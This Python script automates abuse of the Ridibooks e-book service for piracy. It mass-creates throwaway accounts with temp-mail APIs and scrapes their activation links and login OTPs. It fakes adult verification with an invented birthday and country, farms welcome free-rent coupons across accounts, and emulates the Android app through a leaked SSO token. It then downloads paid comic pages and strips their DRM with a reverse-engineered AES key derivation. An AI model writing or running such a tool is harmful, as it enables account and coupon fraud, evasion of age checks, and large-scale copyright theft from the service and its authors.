#!/usr/bin/env python3
"""
RIDIBOOKS full-bypass farmer (zero money, no user account):
  per fresh throwaway account:
    1. tempmail.lol address
    2. signup create-account API (ridibooks.com)
    3. click activation link from mail
    4. password login -> one-time-email OTP challenge -> full web session
    5. self-cert adult (BIRTHDAY_AD_HOC for overseas geo) => 19+
    6. claim paid eps via welcome BL-webtoon FREE_RENT coupon (+ wait-free rent=0 eps)
    7. emulate android app: sso_otp leak -> device register -> stream download
       -> AES-128-ECB decrypt every page (key = sha1("stream"+b[:-6]+b)[:16])
Usage: python3 farm_ridi.py <eps_file> [how_many_accounts]
   eps_file: JSON list of [b_id, tag] pairs to collect (tag used in output dir)
State: /tmp/opencode/ridi/farm_state.json
"""
import requests, json, time, re, hashlib, os, uuid, random, string, sys, quopri
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

R = "/tmp/opencode/ridi"
WEB_UA = "Mozilla/5.0 Chrome/126 Safari/537.36"
APP_UA = "RIDIBOOKS/26.10.2_2026100678 (-onestore)"
STATE_F = f"{R}/farm_state.json"

def load_state():
    try: return json.load(open(STATE_F))
    except Exception: return {"done": {}, "accounts": []}

def save_state(st): json.dump(st, open(STATE_F, "w"))

def jprint(tag, r):
    print(f"[{tag}] {r.status_code} {str(r.text[:120]).replace(chr(10),' ')}")

# ---------- temp mail ----------
_MT_HDR = {"User-Agent": WEB_UA}

def _mtm_new():
    """fallback provider mail.tm → (addr, 'mtm:<jwt>')"""
    d = requests.get("https://api.mail.tm/domains", headers=_MT_HDR, timeout=30).json()
    dom = d["hydra:member"][0]["domain"]
    addr = "rw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) \
        + "@" + dom
    pw = "RidiMail" + random.choice(string.ascii_letters) + "!9x"
    requests.post("https://api.mail.tm/accounts", headers={**_MT_HDR,
                  "Content-Type": "application/json"},
                  json={"address": addr, "password": pw}, timeout=30)
    tok = requests.post("https://api.mail.tm/token", headers={**_MT_HDR,
                        "Content-Type": "application/json"},
                        json={"address": addr, "password": pw}, timeout=30).json()["token"]
    return addr, "mtm:" + tok

def tmail_new():
    last = None
    for att in range(2):
        try:
            r = requests.get("https://api.tempmail.lol/generate",
                             headers={"User-Agent": WEB_UA},
                             timeout=30 if not att else 45)
            a = r.json()
            addr, tok = a.get("address"), a.get("token")
            if addr and tok:
                return addr, tok
            raise ValueError(f"bad payload {str(a)[:60]}")
        except Exception as e:
            last = e
            print("  [tmail gen retry]", str(e)[:80]); time.sleep(3 * (att + 1))
    try:                      # primary provider rate-limited → mail.tm
        return _mtm_new()
    except Exception as e:
        print("  [mail.tm fallback failed]", str(e)[:90])
        raise last

def _mtm_poll(token, want_otp=False):
    h = {**_MT_HDR, "Authorization": "Bearer " + token[4:]}
    ms = []
    for _t in range(6):
        try:
            j = requests.get("https://api.mail.tm/messages", headers=h,
                             timeout=30).json()
            ms = j.get("hydra:member") or []
            break
        except Exception as e:
            print("  [mtm poll retry]", str(e)[:80]); time.sleep(20)
    if not ms:
        return None
    mid = max(ms, key=lambda x: x.get("createdAt") or "")["id"]
    full = requests.get(f"https://api.mail.tm/messages/{mid}", headers=h,
                        timeout=30).json()
    body = (full.get("text") or "") + (full.get("html") or "")
    dec = quopri.decodestring(body.encode()).decode("utf-8", "ignore")
    if want_otp:
        cs = re.findall(r"\b\d{6}\b", re.sub("<[^>]+>", " ", dec))
        return ("otp", cs[0]) if cs else None
    fs = re.findall(r'href="(https?://[^"]+verify[^"]*)"', dec)
    return ("link", fs[0].replace("&amp;", "&")) if fs else None

def tmail_poll(token, want_otp=False):
    if token.startswith("mtm:"):
        return _mtm_poll(token, want_otp)
    for _t in range(5):
        try:
            r = requests.get(f"https://api.tempmail.lol/auth/{token}",
                             headers={"User-Agent": WEB_UA}, timeout=30)
            j = r.json()
            break
        except Exception as e:
            print("  [tmail retry]", str(e)[:80]); time.sleep(20)
    else:
        return None
    ms = j.get("email") or []
    if not ms: return None
    m = max(ms, key=lambda x: str(x.get("received") or ""))
    body = (m.get("body") or "") + (m.get("html") or "")
    dec = quopri.decodestring(body.encode()).decode("utf-8", "ignore")
    if want_otp:
        cs = re.findall(r"\b\d{6}\b", re.sub("<[^>]+>", " ", dec))
        return ("otp", cs[0]) if cs else None
    fs = re.findall(r'href="(https?://[^"]+verify[^"]*)"', dec)
    return ("link", fs[0].replace("&amp;", "&")) if fs else None

# ---------- account creation ----------
def signup(addr):
    s = requests.Session()
    s.headers.update({"User-Agent": WEB_UA, "Origin": "https://ridibooks.com",
                      "Referer": "https://ridibooks.com/account/signup/form"})
    uid = "rw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    pw = "Ridi" + "".join(random.choices(string.ascii_letters + string.digits, k=8)) + "!1"
    for path, payload in (("validation/id", {"user_id": uid}),
                          ("validation/email", {"email": addr})):
        j = s.post(f"https://ridibooks.com/apps/frontend/v1/account/{path}",
                   json=payload, timeout=30).json().get("data", {})
        if not j.get("valid"):
            print("  validation failed:", path, (j.get("messages") or [""])[0][:50])
            return None, None, None
    payload = {"user_id": uid, "password": pw, "password_reenter": pw,
               "email": addr, "name": random.choice(["Kim","Park","Lee"])+" "+random.choice(["Minseok","Jihoon","Yuna"]),
               "birth_year": str(random.randint(1985, 2002)), "gender": random.choice(["M", "F"]),
               "use_confirm": True, "consent_confirm": True,
               "provide_gender_and_birth_confirm": True,
               "marketing_agreement_push_confirm": False}
    r = s.post("https://ridibooks.com/apps/frontend/v1/account/signup/create-account",
               json=payload, timeout=40)
    ok = r.ok and '"valid":true' in r.text.replace(" ", "")
    if not ok:
        print("  create-account failed:", str(r.text[:120]).replace("\n", " "))
        return None, None, None
    # trigger activation mail ourselves (create-account does NOT send it)
    g = s.get(f"https://ridibooks.com/account/email/send?return_url=%2F&email="
              f"{requests.utils.quote(addr)}", timeout=30)
    sent = False
    for attempt in range(4):
        rr = s.post("https://ridibooks.com/apps/frontend/v1/account/verification/send-email",
                    json={"email": addr, "return_url": "/"}, timeout=30)
        j = rr.json() if rr.ok else {}
        d = j.get("data") or {}
        if d.get("valid"):
            sent = True; break
        msg = (d.get("messages") or [""])[0] or str(j)[:80]
        if "30초" in msg: time.sleep(32); continue
        print("  send-email rejected:", msg[:60]); break
    ck = {c.name: c.value for c in s.cookies}
    return (uid, pw, ck) if sent and ok else (None, None, None)

def activate(link):
    s = requests.Session(); s.headers["User-Agent"] = WEB_UA
    g = s.get(link, timeout=40, allow_redirects=True)
    return "signup/complete" in g.url

# ---------- login + otp ----------
def full_login(uid, pw):
    s = requests.Session()
    s.headers.update({"User-Agent": WEB_UA, "Referer": "https://ridibooks.com/account/login",
                      "Origin": "https://ridibooks.com"})
    s.get("https://ridibooks.com/account/login", timeout=30)
    fd = {"username": uid, "password": pw, "platform_from": "web",
          "auto_login": "false", "id_token": "", "platform": "", "user_name": ""}
    r = s.post("https://ridibooks.com/auth/login/password", data=fd,
               timeout=40, allow_redirects=False)
    if not (300 <= r.status_code < 400): return None
    loc = r.headers.get("location", "")
    if "one-time-email" not in loc: return None
    s.get("https://ridibooks.com" + loc if not loc.startswith("http") else loc, timeout=30)
    sr = s.post("https://ridibooks.com/apps/books/auth/mfa/email/send", timeout=30)
    if not sr.ok: return None
    time.sleep(12)
    for _ in range(10):
        got = tmail_poll(TMAIL_TOKEN[0], want_otp=True)
        if got:
            code = got[1]
            rr = s.post("https://ridibooks.com/auth/mfa/challenge",
                        data={"method": "email_otp", "code": code,
                              "platform_from": "web", "purpose": "login"},
                        timeout=40, allow_redirects=False)
            if not (300 <= rr.status_code < 400): return None
            nloc = rr.headers["location"]
            g2 = s.get(nloc if nloc.startswith("http") else "https://ridibooks.com" + nloc,
                       timeout=40, allow_redirects=True)
            ck = {c.name: c.value for c in s.cookies}
            me = requests.Session(); me.cookies.update(ck); me.headers["User-Agent"] = WEB_UA
            m2 = me.get("https://ridibooks.com/apps/account/accounts/me", timeout=20)
            if '"idx"' in m2.text:
                return ck
        time.sleep(7)
    return None

TMAIL_TOKEN = [None]

# ---------- adult self-cert ----------
def verify_adult(w):
    r = w.post("https://ridibooks.com/apps/books/api/csrf-token", timeout=30)
    if r.headers.get("x-csrf-token"): w.headers["X-CSRF-TOKEN"] = r.headers["x-csrf-token"]
    v = w.post("https://ridibooks.com/apps/books/api/account/verify-adult/birthday-ad-hoc/verify",
               json={"birthDate": "1994-05-17", "ipCountry": "TH"}, timeout=25)
    j = v.json() if v.ok else {}
    return j.get("is_verified_adult") is True

# ---------- claims ----------
def route_claims(w, bids):
    claimed = []
    for bid in bids:
        q = {"b_ids[0]": bid, "pay_object": "rent", "return_url": "",
             "return_url_at_fail": "", "is_prefer_return_api_endpoint": "true", "is_v2": "true"}
        rp = w.get("https://ridibooks.com/apps/books/api/payment/route/book",
                   params=q, timeout=30)
        if rp.status_code != 200:
            continue
        j = rp.json()
        info = (j.get("payment_book_cash_and_point") or {}).get("information") or {}
        if str(info.get("total_price")) == "0":
            params = (j.get("payment_book_cash_and_point") or {}).get("parameters")
            pr = w.post("https://ridibooks.com/api/payment/request", data=params,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=40)
            if pr.ok and '"t_id"' in pr.text: claimed.append(bid); print(f"  claim(free) {bid}")
        elif j.get("coupons"):
            c = j["coupons"][0]
            pr = w.post(c["link"], data=c["parameters"],
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=40)
            if pr.ok and '"t_id"' in pr.text: claimed.append(bid); print(f"  claim(coupon) {bid}")
        else:
            # no coupon left / owned
            pass
        time.sleep(1.2)
    return claimed

# ---------- app download ----------
def page_key(b):
    s = "stream" + b[:max(len(b)-6, 0)] + b
    return hashlib.sha1(s.encode()).hexdigest()[:16].encode()

PAGE_WORKERS = int(os.environ.get("PAGE_WORKERS") or 16)
JIT_LO, JIT_HI = (lambda a, b: (a, b))(
    *(float(x) for x in os.environ.get("PAGE_JITTER", "0.3-1.2").split("-", 1)))


def app_download(w, bids, outroot=None, dev=None):
    outroot = outroot or f"{R}/dl_farm"
    leak = w.get("https://ridibooks.com/library/get-app-purchased-list-uri-scheme",
                 timeout=20).json()["uri_scheme"]
    otp = w.post("https://account.ridibooks.com/sso/otp",
                 json={"sso_otp": leak.split("sso_otp=")[-1]}, timeout=20).json()["otp"]
    a = requests.Session(); a.headers["User-Agent"] = APP_UA
    rr = a.get(f"https://account.ridibooks.com/sso/login?otp={otp}&device_id={dev}",
               allow_redirects=False, timeout=25)
    at = a.cookies.get("ridi-at", domain=".ridibooks.com")
    if not at: return []
    a.post("https://account.ridibooks.com/api/user-devices",
           data=json.dumps({"device_id": dev, "device_code": "Android",
                            "device_nick": "SM-G991B"}),
           headers={"Authorization": "Bearer " + at,
                    "Content-Type": "application/json"}, timeout=25)
    got = []
    for bid in bids:
        try:
            meta = a.get(f"https://download.ridibooks.com/stream/books/{bid}/files/metadata"
                         f"?device_id={dev}&quality=recommended", timeout=30)
            if meta.status_code != 200:
                print(f"  [meta {bid}] {meta.status_code}"); continue
            imgs = (meta.json().get("content_images") or [])
            outdir = os.path.join(outroot, bid); os.makedirs(outdir, exist_ok=True)
            k = page_key(bid); n = 0; f = 0

            def _fetch(i):
                t = "cover" if i == 0 else "content"
                u = (f"https://download.ridibooks.com/stream/books/{bid}/files"
                     f"?page_num={i}&type={t}&quality=recommended&device_id={dev}")
                last = None
                for att in range(4):
                    try:
                        time.sleep(random.uniform(JIT_LO, JIT_HI))
                        return i, a.get(u, timeout=90)
                    except requests.RequestException as e:
                        last = e
                        time.sleep(2 ** att + random.random())
                raise last

            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(PAGE_WORKERS) as pool:
                for i, r2 in pool.map(_fetch, range(len(imgs))):
                    if r2.status_code != 200 or len(r2.content) < 300:
                        f += 1; continue
                    d = Cipher(algorithms.AES(k), modes.ECB(), backend=default_backend()).decryptor()
                    pt = d.update(r2.content) + d.finalize()
                    ext = ".jpg" if pt[0:3] == b"\xff\xd8\xff" else ".webp"
                    open(os.path.join(outdir, f"{i:03d}{ext}"), "wb").write(pt); n += 1
        except Exception as e:
            print(f"  [dl {bid}] err {str(e)[:140]}"); continue
        print(f"  ✔ {bid}: {n}/{len(imgs)} pages")
        got.append({"b_id": bid, "pages": n})
    return got

# ---------- main ----------
if __name__ == "__main__":
    eps_file = sys.argv[1]
    n_accounts = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    targets = json.load(open(eps_file))
    st = load_state()
    remaining = [b for b in targets if str(b) not in st["done"]]
    print("targets left:", len(remaining))
    dev = str(uuid.uuid4())
    for acc in range(n_accounts):
        try:
            addr, tok = tmail_new(); TMAIL_TOKEN[0] = tok
            print(f"=== account #{acc+1} {addr}")
            uid, pw, ck0 = signup(addr)
            if not uid:
                save_state(st); continue
            time.sleep(10)
            link = None
            for _ in range(14):
                time.sleep(6)
                g = tmail_poll(tok)
                if g and g[0] == "link": link = g[1]; break
            if not link or not activate(link):
                print("  activation failed"); continue
            wck = full_login(uid, pw)
            if not wck: print("  login/otp failed"); continue
            w = requests.Session(); w.cookies.update(wck); w.headers["User-Agent"] = WEB_UA
            if not verify_adult(w): print("  adult verify failed")
            claimed = route_claims(w, remaining[:60])
            # dedupe
            claimed = [c for c in dict.fromkeys(claimed)]
            if claimed:
                got = app_download(w, claimed, dev=dev)
                for g in got:
                    st["done"][str(g["b_id"])] = {"pages": g["pages"], "acct": uid}
                st["accounts"].append({"uid": uid, "pw": pw, "email": addr,
                                       "claims": claimed})
        except Exception as e:
            print(f"  account error: {str(e)[:150]}")
        save_state(st)
        remaining = [b for b in targets if str(b) not in st["done"]]
        print(f"state: done={len(st['done'])} left={len(remaining)}")
        if not remaining:
            print("ALL TARGETS COLLECTED"); break
